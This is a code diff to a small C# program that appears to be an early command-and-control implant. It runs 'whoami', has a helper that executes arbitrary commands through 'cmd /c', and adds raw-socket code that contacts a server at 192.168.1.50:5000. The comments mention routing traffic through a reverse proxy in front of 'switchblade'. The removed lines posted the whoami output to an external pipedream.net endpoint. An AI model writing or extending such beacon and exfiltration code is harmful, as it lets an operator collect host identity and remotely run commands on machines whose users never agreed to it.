@@ -1,7 +1,11 @@
 ﻿using System;
 using System.Net;
+using System.Net.Security;
 using System.Net.Http;
+using System.Net.Sockets;
 using System.Threading.Tasks;
+using System.Security.Authentication;
+using System.Text;
 // https://qawithexperts.com/article/c-sharp/run-cmd-commands-using-c/520
 // https://stackoverflow.com/a/27326758/9329272
 //
@@ -18,36 +22,30 @@ namespace Testing
 
             Console.WriteLine(whoami);
 
-            Task<string> post = PostMe("https://eoqqzdfuzmgq7gg.m.pipedream.net/", whoami);
-
-            //Console.WriteLine(post);
-
-            //Task<string> stat = GetMe("https://eoqqzdfuzmgq7gg.m.pipedream.net/");
-
-            //Console.WriteLine(stat);
+            GetWebPage("192.168.1.50","/index1.html");
         }
-        
-        public static async Task<string> GetMe(string url) 
-        { 
-            //GET the object to the specified URI 
-            var response = await client.GetAsync(url);
-            //Read back the answer from server
-            var responseString = await response.Content.ReadAsStringAsync();
-            return responseString;
-        } 
-        public static async Task<string> PostMe(string url, string whoami)
+        public static string GetWebPage(string host, string page)
+        // This works!!!
+        // This allows us to send a GET to a webpage through a socket
+        // We need to now put a reverse proxy infront of switchblade so that we can route non-https traffic to https
+        // But over http, this works fine. But doesn't work with sslcontext=adhoc
         {
-            var values = new Dictionary<string, string>
-            {  
-                { "id", whoami }
-            };
-            //form "postable object" if that makes any sense
-            var content = new FormUrlEncodedContent(values);
-            //POST the object to the specified URI 
-            var response = await client.PostAsync(url, content);
-            //Read back the answer from server
-            var responseString = await response.Content.ReadAsStringAsync();
-            return responseString;
+            // Setup the socket
+            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            s.Connect(host, 5000);
+
+            // Construct the request string
+            string request = "GET " + page + " HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
+            byte[] requestBytes = Encoding.ASCII.GetBytes(request);
+
+            // Send the request
+            s.Send(requestBytes, requestBytes.Length, 0);
+
+            // Receive the response
+            byte[] responseBytes = new byte[4096];
+            int bytesReceived = s.Receive(responseBytes, responseBytes.Length, 0);
+            string response = Encoding.ASCII.GetString(responseBytes, 0, bytesReceived);
+            return response;
         }
         static string ExecuteMe(string command){
             System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
